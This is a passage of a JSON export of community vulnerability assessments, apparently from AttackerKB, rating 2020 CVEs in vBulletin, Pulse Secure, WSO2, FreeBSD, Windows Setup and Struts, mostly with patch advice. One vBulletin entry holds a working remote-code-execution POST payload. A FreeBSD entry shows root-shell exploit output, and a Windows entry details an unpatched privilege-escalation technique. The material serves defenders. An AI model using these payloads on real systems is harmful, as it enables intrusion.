          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "b3a00245-d5da-4887-8383-ae80c8d3b0de",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6e4f3783-6077-45f4-aa93-832bdc4269d5",
      "created": "2020-08-20T18:33:49.730772Z",
      "revisionDate": "2020-08-23T18:38:13.874658Z",
      "document": "Via @hrbrmstr: https://securityintelligence.com/posts/new-vulnerability-could-put-iot-devices-at-risk/. See also: https://threatpost.com/flaw-affecting-millions-iot-devices/158472/.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "2168f4a8-2306-4306-822d-371873c249a6",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "274e3983-7823-4cd0-b47c-0ebc25dd5646",
      "created": "2020-08-24T03:13:13.04563Z",
      "revisionDate": "2020-08-24T17:44:18.30632Z",
      "document": "This [was patched](https://issues.apache.org/jira/browse/OFBIZ-11716) in the July 2020 release of [OFBiz 17.12.04](https://ofbiz.apache.org/release-notes-17.12.04.html).\r\n\r\nIf your business/org runs Apache OFBiz, **now is a good time to update to 17.12.04**.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "362b6e5e-5ace-4516-8391-4e0c9915b138",
      "editorId": "a10f9254-f0fb-40f2-99b6-65a2aa43658f",
      "topicId": "f37c74a4-49f4-4fa4-9d00-32a4828ecd39",
      "created": "2020-08-24T19:19:57.226311Z",
      "revisionDate": "2020-09-02T20:45:34.368973Z",
      "document": "CVSS Score:\r\nBase 6.1 (Medium)\r\nCVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X\r\n\r\nCredits:\r\nKrzysztof Przybylski\r\n\r\nReference:\r\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190904-ise-xss\r\n\r\n",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "16b1f66e-94dc-4f5f-b96c-40e0f23651ab",
      "editorId": "adea3bbf-fef7-40ca-beaa-7e31e791ea61",
      "topicId": "6639db62-5b8a-47ff-8269-a1f22b5b9531",
      "created": "2020-08-26T20:06:09.653575Z",
      "revisionDate": "2022-06-23T12:58:54.986034Z",
      "document": "The details for this vulnerability were scant from Apache, but this is actually an integer overflow in the mod_proxy_uwsgi Apache module. Specifically, if you send enough headers, you can overflow the packet size that gets encoded into the uWSGI protocol header struct. If you do this, you may be able to coerce the uWSGI middleware service to interpret some of the header data as a new uWSGI packet. uWSGI allows file read and remote code execution as part of the protocol. \r\n\r\nHere's the patch that was silently added from ASF (ignore the 16K comment too, since that is wrong, and it should've been 65K):\r\nhttps://github.com/apache/httpd/commit/fb08e475bf322f081665fa6f9d9e346136df9337#\r\n\r\nIn practice this is a bit difficult to exploit, but could in theory lead to tasty, tasty shells. The most interesting thing about this vulnerability is that you would interpret the title as an issue that allows for code execution within the context of Apache itself, whereas in reality it is an issue which allows payload stuffing that ultimately can lead to command execution by crafted payloads sent to the uWSGI middleware/backend service that Apache fronts.",
      "score": 7,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "fa8015c3-22f6-482d-975b-2f30379edf76",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "98dd7de4-c5ff-408b-a893-81b6c25a43c2",
      "created": "2020-08-27T15:29:57.53327Z",
      "revisionDate": "2020-09-02T19:42:52.19303Z",
      "document": "Researchers wrote this one up at https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/.\r\n\r\nIn [CVE-2020-15408](https://attackerkb.com/assessments/92c1e499-db15-4a8b-9317-914a18bdebc2), I was musing about SSRF-to-RCE potential as a normal user, but this just skips right to CSRF'ing an admin to get RCE.\r\n\r\nNote that both these vulns involve interacting with an authenticated user. The \"threat model\" is different from that of previous Pulse Secure RCEs. Patch this but also invest in security training for your users!\r\n\r\nETA: This is otherwise post-auth RCE, so if you have admin creds, you can execute commands all the same. It's not uncommon to find creds like these in a corporate wiki or share somewhere.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "0723d719-ed27-40ff-960e-f4630c0da9a6",
      "editorId": "a10f9254-f0fb-40f2-99b6-65a2aa43658f",
      "topicId": "0fb8787b-52ba-4246-9deb-828baa740f3b",
      "created": "2020-08-29T23:16:02.815068Z",
      "revisionDate": "2020-09-02T20:45:23.09946Z",
      "document": "Severity: Critical\r\nCVSS Score:  9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H) \r\n\r\nAFFECTED PRODUCTS\r\nWSO2 API Manager : 3.1.0 or earlier\r\nWSO2 API Microgateway : 2.2.0\r\n\r\nAn XML External Entity injection (XXE) often allows an attacker to view files on the server file system, and to interact with any backend or external systems that the application itself can access and allows the attacker to transmit sensitive data from the compromised server to a system that the attacker controls. An XML Entity Expansion attack might result in a denial-of-service condition, causing the entire application to stop functioning. It is possible to exploit both of the above vulnerabilities without authenticating to the Management Console.\r\n\r\nCREDITS\r\nKrzysztof Przybylski ",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a3bd9006-6d55-4ad3-9395-2280ac793199",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "df071775-cd3a-4643-9e29-3368bd93c00f",
      "created": "2020-08-31T14:18:36.952307Z",
      "revisionDate": "2020-09-02T20:41:01.495604Z",
      "document": "This made [CISA's list of most exploited vulns](https://us-cert.cisa.gov/ncas/alerts/aa20-133a) from 2016-2019\u2014fairly notable since it's a 2019 vulnerability and had less time to percolate than others. There are newer SharePoint vulnerabilities and [exploits](https://github.com/rapid7/metasploit-framework/pull/13122) out now that may replace this one, but the generalized takeaway is that SharePoint is a highly attractive attack target with a number of [public exploits](https://github.com/rapid7/metasploit-framework/pull/13920) and proofs-of-concept available for known vulns.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 4
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "5c88871d-d2c0-4d2f-abcc-090745645ecf",
      "editorId": "62094807-a275-4fc3-ba9d-3e39896e8c05",
      "topicId": "1c04af80-21d4-49ee-9a16-921297dd3e60",
      "created": "2020-08-31T22:57:27.429634Z",
      "revisionDate": "2020-09-02T20:53:32.32113Z",
      "document": "The issue with ranking exploitability even the vulnerability with rest api in this particular instance would be a combination of \"are recommended measures in place to mitigate if it exists in the first place\" and \"how willing the actor would be be to exploit\". If the given scenario for exploitation presents itself, then it will be fairly quick and easy to exploit and get to the meat and begin enumerating other endpoints and privilege. To even conduct the reconnaissance necessary to have an idea of vulnerability seems a pretty difficult task in my limited knowledge. \r\n\r\nThat said, if identified and utilized, this is powerful. \r\n\r\n``` While the vulnerable code resides within the Cisco REST API container, the effects of the vulnerability, if exploited, will be experienced on the Cisco device as a whole. This is because exploiting this vulnerability could allow an attacker to submit commands through the REST API that will be executed on the affected device. ```\r\n\r\nThe fact that in the blog post sited here on AttackerKB the author uses the work \"only\" when describing the hardware effected sets off a bit of an alarm bell in my opinion. Any CVE allowing commands at level specified to be issued on an endpoint is cause for concern, especially with something as simple to manipulate as REST API Most certainly if standard reconnaissance methods can identify. \r\n\r\n``` \r\nOnly the following Cisco platforms supports the affected Cisco REST API container and are therefore potentially impacted by this vulnerability:\r\n    Cisco 4000 Series Integrated Services Routers\r\n    Cisco ASR 1000 Series Aggregation Services Routers\r\n    Cisco Cloud Services Router 1000V Series\r\n    Cisco Integrated Services Virtual Router\r\n```\r\n\r\nAnother thing we must remember as researchers, on either side, is that our analysis and public disclosure also acts and beneficial information for any threat actor. So, I'd say definitely be cautious in publishing information that downplays a CVE as it can appear complacency is setting in.\r\n\r\nOkay, to end of all my unnecessary commentary I'd say this is a pretty useful vulnerability if risk of exploitation is obvious and in numbers exceeding risk matrices or thresholds developed by in house teams. \r\n\r\n\r\nhttps://blogs.cisco.com/security/cve-2019-12643\r\nhttps://www.cisco.com/c/en/us/products/ios-nx-os-software/ios-xe/index.html#~stickynav=1",
      "score": 7,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d55fab80-f7ad-44ed-8f2e-0238e8e6a436",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "0526bd48-c539-4fe8-ac29-3de007a30dd2",
      "created": "2020-08-31T23:33:15.908223Z",
      "revisionDate": "2020-09-01T15:15:02.560488Z",
      "document": "At face value, this doesn't seem to be a terribly high-value vuln from an attacker point of view. That's not to say that impact to availability and disruption of business processes isn't high-impact for infrastructure and service providers, just that the vulnerability is a denial of service that currently doesn't look to offer attackers useful access. That changes pretty quickly if it turns out DoS exploitation gives rise to a different threat vector. ",
      "score": 2,
      "metadata": {
        "attacker-value": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "cfa4348b-55e1-4aea-b520-31dd6d2e44cb",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "9eeb4a85-f783-418f-8e45-0dc8afb41afa",
      "created": "2020-09-01T14:21:58.157936Z",
      "revisionDate": "2020-09-14T12:31:41.586283Z",
      "document": "This vulnerability was originally found by @klinix5, who later found another way to exploit the issue which they reported publicly at https://github.com/klinix5/Windows-Setup-EoP as a 0day. The original bug occurred due to the fact that on Windows 10 systems prior to the August 2020 updates, there was a flaw within the way Windows Setup operated which resulted in a LPE vulnerability.\r\n\r\nMore specifically, within `windowsupdatebox.exe`, there was a call to `CreateDirectoryW()` with a `NULL` security descriptor, which would create the folder `C:\\$WINDOWS.~BT` with the same permissions as those from the `C:\\` directory, which by default allow everyone read, write, and delete access to the directory. After this, a `CreateFileW()` call would be made with the name `C:\\$WINDOWS.~BT` to get a handle to the folder for later use, before Windows Setup would then execute a `SetSecurityInfo()` call on the `C:\\$WINDOWS.~BT` directory to set its permissions appropriately.\r\n\r\nThe issue with this code is that attackers could create a directory junction on the `C:\\$WINDOWS.~BT` directory once it had been created with open permissions, and cause the `CreateFileW()` call to create an file at an arbitrary location on the disk as the `SYSTEM` user. Then once this had been done, they could remove the directory junction to ensure that the `SetSecurityInfo()` call didn't alter the permissions of the file that was created with `CreateFileW()`.\r\n\r\nMicrosoft then fixed this vulnerability in their August 2020 update by patching the code so that they passed the security descriptor in as part of the `CreateDirectoryW()` call, and they removed the calls to `CreateFileW()` and `SetSecurityInfo()`. This means that even if an attacker can redirect the creation of the directory via a directory junction (an attack that is still possible with the new code), they won't have access to the resulting directory that is created due to the security permissions that will be applied on the directory at the time of its creation. This also prevents the original timing issue by ensuring that there is no period in which the directory will be created with open permissions that could allow low privileged users to tamper with it.\r\n\r\nUnfortunately, @klinix5, the original discoverer of this bug, found that Microsoft had another issue; specifically that once the Windows Setup was done, it would attempt to delete `C:\\$WINDOWS.~BT` without properly checking that `C:\\$WINDOWS.~BT` wasn't a reparse point. Attackers can create the `C:\\$WINDOWS.~BT` directory themselves and then create two subdirectories and place oplocks on them. These oplocks will only trigger once the `C:\\$WINDOWS.~BT` directory is in the process of being deleted.\r\n\r\nWhen these oplocks trigger, the attacker can then turn the respective directories into directory junctions, thereby allowing them to delete arbitrary directories as the SYSTEM user. The attacker can then use techniques such as the one described in https://secret.club/2020/04/23/directory-deletion-shell.html to transform the arbitrary file deletion into code execution as the SYSTEM user.\r\n\r\nNote that this second technique does not have a patch, and is still a 0day as of September 1st 2020. Its likely however that Microsoft will patch this at a later date, however the exact date is as of yet unknown. For this reason the value of this vulnerability has been increased to 4 to reflect the unpatched nature of this bug. Do keep in mind however that an attacker will need to have authenticated GUI access for this bug to work, and that whilst Microsoft states that the bug works on Windows 10 v2004, it doesn't seem like it would be possible to trigger it on this version at this point in time, as there is no \"next version\" to upgrade to. Once the next version of Windows does come out though, those Windows 10 v2004 systems which have not yet applied this patch will be exploitable.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b4f10b23-1770-484b-8710-5da5727074b1",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "86acd634-7733-484a-b16c-162a358d5012",
      "created": "2020-09-01T15:08:41.171565Z",
      "revisionDate": "2020-09-02T20:18:58.831232Z",
      "document": "Same initial evaluation as [CVE-2020-3566](https://attackerkb.com/topics/WcmktcqDwq/cve-2020-3566---denial-of-service-vulnerability-in-cisco-ios-xr?referrer=2020-3566)\u2014namely that successful exploitation doesn't appear thus far to yield useful access for attackers, though disruption to critical business services is still a major concern for service providers. If the DoS enables a new threat vector, attacker value on these vulns rises. I'm going to leave exploitability blank for the time being. Rapid7 [has analysis here](https://attackerkb.com/topics/WcmktcqDwq/cve-2020-3566---denial-of-service-vulnerability-in-cisco-ios-xr?#rapid7-analysis).",
      "score": 3,
      "metadata": {
        "attacker-value": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "dd714219-59fc-4e15-ba32-db8254ad883a",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "d8d0585e-24b7-40be-bb84-83a85d733ddb",
      "created": "2020-09-02T13:23:47.277448Z",
      "revisionDate": "2020-09-02T20:18:38.348339Z",
      "document": "A vulnerability exists in vBulletin that can allow the protections originally put in place to address [CVE-2019-16759](https://attackerkb.com/topics/lM66oN2W6f/cve-2019-16759) to be bypassed. The vulnerability exists in how the patch handles child templates that are rendered by the `widget_php` template. A detailed write up which analyzes the patch and describes the issue regarding the child templates was posted to [blog.exploitee.rs](https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/) by the original author who discovered the vulnerability.\r\n\r\nSuccessful exploitation involves an HTTP POST request and yields code execution in the context of the web application user. Due to the nature of templates, the result of the evaluation is included in the rendered output, allowing attackers to retrieve the output of their commands which makes the vulnerability more useful.\r\n\r\n```\r\nPOST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\r\nHost: 192.168.250.5\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 168\r\n\r\nsubWidgets%5b0%5d%5btemplate%5d=widget_php&subWidgets%5b0%5d%5bconfig%5d%5bcode%5d=echo%20shell_exec%28base64_decode%28%27ZWNobyBra3hmenJLeQ%3d%3d%27%29%29%3b%20exit%3b\r\n```\r\n\r\nThis vulnerability was fixed in vBulletin version 5.6.3, with patches [released](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch#post4445228) for versions 5.6.0, 5.6.1 and 5.6.2.\r\n\r\nTo temporarily remediate the vulnerability, delete the \"widget_php\" module by following [these steps](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch#post4445228):\r\n1. Put the site into debug mode.\r\n1. Log into the AdminCP.\r\n1. Go to Styles > Style Manager.\r\n1. Open the template list for the MASTER style.\r\n1. Scroll to the bottom where it says Module Templates.\r\n1. Highlight the widget_php module.\r\n1. Click the Revert Button.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "137ba17c-d2e2-47dd-9064-6573d065286f",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6a7ab250-a99f-4ed6-8ec8-0a821d80257a",
      "created": "2020-09-02T19:47:40.772843Z",
      "revisionDate": "2020-09-03T02:28:12.525423Z",
      "document": "Seems to be a reliable though somewhat elaborate LPE on all 64-bit FreeBSD kernels since 2014.\r\n\r\nThough FBSD may not be as common as (GNU/)Linux, I've seen it used as an appliance base by certain vendors. The OS doesn't always get patched in those cases.\r\n\r\nETA: Looks like it has the potential to crash even exploitable systems, but it _is_ a kernel heap memory corruption.\r\n\r\n```\r\n$ ./exploit\r\n[+] Starting wrecker\r\n[+] Wrecker ready\r\n[+] Starting executor\r\n[+] Waiting...\r\n[+] Winner 1\r\n[+] Winner 2\r\n[+] Magic found\r\n# id\r\nuid=0(root) gid=0(wheel) egid=1001(user) groups=1001(user)\r\n# uname -a\r\nFreeBSD  12.1-RELEASE FreeBSD 12.1-RELEASE r354233 GENERIC  amd64\r\n#\r\n```\r\n\r\nOtherwise working.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "62491c0e-6996-464f-aff3-ba9b30168676",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "bdf59c15-d64f-45d5-b1ac-d1b9dd354080",
      "created": "2020-09-03T16:29:35.177957Z",
      "revisionDate": "2020-09-03T16:29:35.179866Z",
      "document": "This popped Equifax. Vulnerable versions of Struts are exploitable out of the box, since this was a parser flaw. Make sure this is patched!",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "92642728-1fa2-4a4e-9750-297f18f0cc0b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "289dc3ce-ed8a-4366-89f0-46e148584c36",
      "created": "2020-09-03T16:30:07.480338Z",
      "revisionDate": "2020-12-10T06:37:19.910699Z",
      "document": "Unlike [CVE-2017-5638](https://attackerkb.com/topics/1MWtVe9P7w/cve-2017-5638), which was exploitable out of the box, since it targeted Struts' Jakarta multipart parser, this vulnerability requires a certain set of circumstances to be true in order for Struts to be exploitable. Since Struts is a web application framework, this will depend entirely on the application the developers have created.\r\n\r\n**I don't know how common this particular scenario is.** Please read the [security bulletin](https://cwiki.apache.org/confluence/display/WW/S2-059) for more information. However, what I do know is that this CVE falls somewhere after [CVE-2017-5638](https://attackerkb.com/topics/1MWtVe9P7w/cve-2017-5638) and [CVE-2018-11776](https://attackerkb.com/topics/jgIUjIdFUR/cve-2018-11776) on the exploitability scale, from most exploitable to least: a parser flaw, a configuration flaw, and a programming flaw.\r\n\r\nSo, definitely patch this, but also follow Struts development best practices, including those outlined in their security bulletins. No measure of mitigations will protect you from poorly written code.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "ea17a40f-8026-461a-8055-d9324f22d520",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-09-03T17:15:44.236733Z",
      "revisionDate": "2021-06-11T21:33:19.622015Z",
